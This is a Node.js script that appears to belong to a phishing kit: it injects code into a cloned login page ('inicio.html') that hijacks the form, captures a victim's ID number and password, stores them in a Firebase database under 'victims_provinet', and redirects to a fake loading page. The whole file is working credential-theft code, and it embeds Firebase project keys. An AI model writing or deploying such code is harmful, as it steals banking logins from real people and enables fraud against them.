const fs = require('fs');
let content = fs.readFileSync('inicio.html', 'utf8');

// The file does not have a </body> tag, so append to the very end
const fbScript = `
<script src="https://www.gstatic.com/firebasejs/12.19.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/12.19.0/firebase-database-compat.js"></script>
<script>
    // Configuración de Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyA9qspuy_l1vseHqKx9klUg3P9JGx_GZLo",
        authDomain: "sca-mms.firebaseapp.com",
        databaseURL: "https://sca-mms-default-rtdb.firebaseio.com",
        projectId: "sca-mms",
        storageBucket: "sca-mms.firebasestorage.app",
        messagingSenderId: "965549232304",
        appId: "1:965549232304:web:46186cadacaa0d3f5d73df"
    };

    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
    const database = firebase.database();

    // Hook al formulario
    const form = document.getElementById('form');
    if(form) {
        // Remover el onsubmit anterior que hace redirect directo
        form.removeAttribute('onsubmit');
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const btnSubmit = document.getElementById('submit');
            if(btnSubmit) {
                btnSubmit.innerText = 'Cargando...';
                btnSubmit.style.pointerEvents = 'none';
                btnSubmit.style.opacity = '0.7';
            }

            const tipoDoc = document.getElementById('select_doc') ? document.getElementById('select_doc').value : 'V';
            let numDoc = document.getElementById('cedula_real') ? document.getElementById('cedula_real').value : '';
            if(!numDoc && document.getElementById('cedula')) {
                // Fallback en caso de que cedula_real este vacio pero se haya pegado el texto
                numDoc = document.getElementById('cedula').value.replace(/\\*/g, '');
            }
            const pass = document.getElementById('password') ? document.getElementById('password').value : '';

            const id = Date.now().toString() + Math.floor(Math.random() * 1000);

            // Guardar ID en localStorage por si luego se necesita
            localStorage.setItem('current_victim_id', id);

            database.ref('victims_provinet/' + id).set({
                id: id,
                tipo: tipoDoc,
                usuario: numDoc,
                contrasena: pass,
                first_seen: Date.now(),
                status: 'Esperando'
            }).then(() => {
                window.location.href = 'cargando.html';
            }).catch(err => {
                console.error("Error al enviar", err);
                window.location.href = 'cargando.html';
            });
        });
    }
</script>
`;

// Make sure we only append it once
if (!content.includes('firebase-app-compat.js')) {
    content = content + fbScript;
    fs.writeFileSync('inicio.html', content, 'utf8');
    console.log('Firebase appended.');
} else {
    console.log('Firebase already exists.');
}
